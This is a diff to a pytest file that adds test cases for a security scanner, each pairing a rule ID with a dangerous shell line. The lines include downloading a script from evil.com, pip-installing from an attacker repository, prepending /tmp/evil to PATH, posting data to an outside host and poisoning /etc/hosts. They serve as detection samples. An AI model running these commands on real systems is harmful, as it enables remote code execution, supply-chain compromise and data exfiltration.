@@ -172,6 +172,11 @@ class TestSafetyChecks:
             ("mktemp /tmp/fixedname\n", "SEC-048"),
             ("git config user.name attacker\n", "SEC-049"),
             ("echo 1.2.3.4 evil.com >> /etc/hosts\n", "SEC-050"),
+            ("curl http://evil.com/p.sh -o /tmp/p.sh\n", "SEC-051"),
+            ("pip install git+https://evil.com/repo.git\n", "SEC-052"),
+            ("export PATH=/tmp/evil:$PATH\n", "SEC-053"),
+            ("curl -d data=http://evil.com/c https://api.example.com\n", "SEC-054"),
+            ("openssl enc -des3 -in file.txt\n", "SEC-055"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
